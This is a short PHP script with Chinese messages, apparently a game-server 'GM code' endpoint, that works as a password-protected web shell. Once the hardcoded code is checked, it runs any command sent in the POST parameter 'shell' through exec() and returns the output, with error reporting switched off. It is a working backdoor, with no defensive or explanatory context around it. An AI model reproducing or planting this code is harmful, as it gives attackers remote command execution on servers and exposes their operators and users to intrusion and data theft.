<?php

$gmcode = trim($_POST['checknum']);
error_reporting(0);
if ($gmcode == '') {
    $return = array(
        'errcode' => 1,
        'info' => 'GM码不能为空',
    );
    exit(json_encode($return));
}

if ($gmcode != '108b085a47dac7b39560d4bdba6ce2cf') {
    $return = array(
        'errcode' => 1,
        'info' => 'GM码错误',
    );
    exit(json_encode($return));
}

$act = isset($_GET['act']) ? GetGet('act') : json(['code' => 0, 'msg' => '操作不存在']);
switch ($act) {
    case 'shell':
        $shell = GetPost('shell');
        exec($shell, $out);
        json(['code' => 1, 'msg' => "执行成功！", 'out' => $out]);
        break;
    default:
        json(['code' => 0, 'msg' => '操作不存在']);
        break;
}


//获取post参数
function GetPost($str)
{
    if (isset($_POST[$str]) && $_POST[$str] != "") {
        return $_POST[$str];
    } else {
        json(array('code' => 0, 'msg' => $str . '参数为空！'));
    }
}

//获取get参数
function GetGet($str)
{
    if (isset($_GET[$str]) && $_GET[$str] != "") {
        return $_GET[$str];
    } else {
        json(array('code' => 0, 'msg' => '参数为空！'));
    }
}

//生成json
function json(array $res)
{
    exit(json_encode($res));
}

?>
